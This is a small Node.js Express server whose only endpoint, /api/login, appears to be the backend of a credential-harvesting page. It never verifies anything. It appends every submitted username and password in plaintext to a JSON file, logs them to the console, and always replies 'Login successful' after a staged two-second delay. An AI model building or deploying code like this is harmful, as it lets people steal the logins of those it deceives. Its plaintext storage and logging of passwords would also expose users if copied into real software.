const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Endpoint to save login credentials
app.post('/api/login', (req, res) => {
  try {
    const { username, password } = req.body;
    
    // Create data directory if it doesn't exist
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir);
    }
    
    // Save credentials to JSON file
    const credentials = { username, password, timestamp: new Date().toISOString() };
    const filePath = path.join(dataDir, 'credentials.json');
    
    // If file exists, read it and append to the array
    let existingData = [];
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, 'utf8');
      try {
        existingData = JSON.parse(fileContent);
        if (!Array.isArray(existingData)) {
          existingData = [existingData];
        }
      } catch (error) {
        console.error('Error parsing existing credentials:', error);
      }
    }
    
    // Add new credentials and write back to file
    existingData.push(credentials);
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));
    
    console.log('Credentials saved:', username, password);
    
    // Simulate a delay to show loading screen
    setTimeout(() => {
      res.status(200).json({ message: 'Login successful', success: true });
    }, 2000);
    
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ message: 'Error processing login', success: false });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
}); 